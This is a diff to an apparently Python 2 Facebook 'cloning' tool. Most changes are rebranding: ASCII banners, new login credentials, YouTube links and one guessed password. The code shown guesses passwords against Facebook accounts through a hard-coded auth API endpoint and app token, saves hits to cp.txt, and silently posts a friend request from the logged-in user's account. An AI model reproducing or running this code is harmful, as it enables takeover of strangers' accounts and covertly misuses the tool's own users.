@@ -49,12 +49,14 @@ def jalan(z):
 ##### LOGO #####
 logo = """
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
-\033[1;96m       
-\033[1;96m        ITX DARK FAMILY X3 BABSA
-\033[1;96m        
-\033[1;96m        
-\033[1;96m        
-\033[1;96m                          
+\033[1;96m          _____                     _ _ 
+\033[1;96m         / ____|                   | (_) ⚡
+\033[1;96m        | (___  _ __   ___  ___  __| |_  
+\033[1;96m         \___ \| '_ \ / _ \/ _ \/ _` | | 
+\033[1;96m         ____) | |_) |  __/  __/ (_| | |
+\033[1;96m        |_____/| .__/ \___|\___|\__,_|_|
+\033[1;96m               | |                      
+\033[1;96m               |_|   Aahil Updated 0.3                   
 \033[1;91m       ♦♦♦———————————————————————————————♦♦♦
 """
 def tik():
@@ -75,13 +77,35 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print  """
 
-\033[1;97m      ITX DARSHAN H3R3 :V                   
+\033[1;97m        ___    ___   _   _ _____ _     
+\033[1;92m       / _ \  / _ \ | | | |_   _| | Updated✔ 
+\033[1;97m      / /_\ \/ /_\ \| |_| | | | | |    
+\033[1;92m      |  _  ||  _  ||  _  | | | | |    
+\033[1;97m      | | | || | | || | | |_| |_| |____
+\033[1;97m      \_| |_/\_| |_/\_| |_/\___/\_____/
+                                                               
 
+"""
+
+jalan("\033[1;97m•◈•───────•◈ NOT A NAME ITS BRAND •◈•───────•◈•")  
+
+
+jalan("\033[1;96m•◈•   _____ _____  ______ ______ _____ _____ ")
+jalan("\033[1;96m•◈•  / ____|  __ \|  ____|  ____|  __ \_   _|")
+jalan("\033[1;97m•◈• | (___ | |__) | |__  | |__  | |  | || |  ")
+jalan("\033[1;96m•◈•  \___ \|  ___/|  __| |  __| | |  | || |  ")
+jalan("\033[1;96m•◈•  ____) | |    | |____| |____| |__| || |_ ")
+jalan("\033[1;96m•◈• |_____/|_|    |______|______|_____/_____|")
+ 
 jalan("   \033[1;91m INDAIN USERZ USE ANY PROXY ")	
 jalan("   \033[1;91m WIFI USERZ USE ANY PROXY ")	
 
-CorrectUsername = "dark"
-CorrectPassword = "dark"
+jalan("   \033[1;93m Welcome to Aahil Creations ")
+
+jalan("\033[1;97m•◈•──────────•◈•\033[1;96mBlacktiger\033[1;96m•◈•──────────•◈•")
+
+CorrectUsername = "rana"
+CorrectPassword = "rana"
 
 
 loop = 'true'
@@ -94,10 +118,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
 
 def login():
 	os.system('clear')
@@ -141,7 +165,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;36;40m[✓] Login Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCpkJt660_upnZRNjnuLFNEA')
+				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -194,7 +218,7 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
 	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Mraf2"																														
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -301,7 +325,7 @@ def pilih_super():
 	print "\n\033[1;97m        ❈     \033[1;97mTo Stop Process Press CTRL+Z \033[1;97m    ❈"
 	print "   \033[1;31;48m●💋══════════════════◄►══════════════════💋●"
 
-	jalan('                    \033[1;97mMr Af2 start cloning Wait...')
+	jalan('                    \033[1;97mAahil start cloning Wait...')
 	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
 
 	def main(arg):
@@ -398,7 +422,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'Afghanistan'
+															pass7 = 'Pakistan'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -420,6 +444,12 @@ def pilih_super():
 	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
 	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
+	print """
+\033[1;31;40m ●════════════════════════◄►════════════════════════●
+           """
+	raw_input("\n\033[1;97m[\033[1;97mExit\033[1;97m]")
+	super()
+
 def brute():
     os.system('clear')
     try:
@@ -476,5 +506,8 @@ def brute():
 
         except IOError:
             print '\033[1;97m[!] File not found...'
+            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
+            super()
+
 if __name__ == '__main__':
 	login()
